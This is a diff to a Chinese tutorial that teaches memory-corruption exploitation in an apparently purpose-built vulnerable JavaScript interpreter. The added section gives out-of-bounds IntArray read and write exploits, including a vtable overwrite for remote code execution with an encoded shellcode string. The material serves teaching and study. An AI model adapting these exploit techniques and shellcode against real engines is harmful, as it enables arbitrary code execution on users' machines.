@@ -112,7 +112,7 @@ Uaf 的原理是:**当HTML 元素调用了remove() 删除自身并且在堆中�
 通常情况下,我们都可以正常访问buffer1 里面的数据,假设往buffer1 里面读写数据的时候的时候一不小心就越过了buffer1 本来的长度到了buffer2 呢?<br/><br/>
 ![read_write_out_of_buffer1](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_write_out_of_buffer1.png)<br/><br/>
 
-Exapmle 1 -- String 对象substr() 读取越界:<br/><br/>
+Exapmle 1 -- String 对象substr() 越界读取:<br/><br/>
 **Exploit** :<br/>
 ```javascript
 var first_string='test string';
@@ -187,4 +187,29 @@ console.log(read_data);
 ![read_out_of_bound_read_object_virtual_table](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_read_object_virtual_table.png)<br/><br/>
 因为`substr()` 是以String 对象读取出来的,所以会输出的时候会显示错误<br/><br/>
 ![read_out_of_bound_read_object_output](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_read_object_output.png)<br/><br/>
+
+Example 2 -- IntArray 数组越界读写<br/><br/>
+**Exploit** 1 获取IntArray 类基地址:
+```javascript
+var first_array=new IntArray(4);
+var read_array=new IntArray(1,2,3,4);
+
+console.log(first_array[0xA]);
+```
+
+**Exploit** 2 远程代码执行:
+```javascript
+var write_array=new IntArray(4);
+var exploit_array=new IntArray(1,2,3,4);
+var read_exploit_virutal_table_array=new IntArray(4);
+var exploit_virutal_table=new IntArray(0,0,1);
+var read_shellcode_address=new IntArray(4);
+var shellcode='%ud231%u30b2%u8b64%u8b12%u0c52%u528b%u8b1c%u0842%u728b%u8b20%u8012%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a%uc701%ued31%u348b%u01af%u45c6%u3e81%u6957%u456e%uf275%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%u006A%u2E68%u7865%u6865%u6163%u636C%ue589%u4dfe%u3153%u50c0%uff55%u00d7';
+exploit_virutal_table[0x2]=read_shellcode_address[0x27];
+write_array[0xA]=read_exploit_virutal_table_array[0xD];
+exploit_array.length();
+
+```
+int_array::int_array
+
 TIPS! 所有的测试都在`Debug` 选项下的`Debug` 模式下进行..
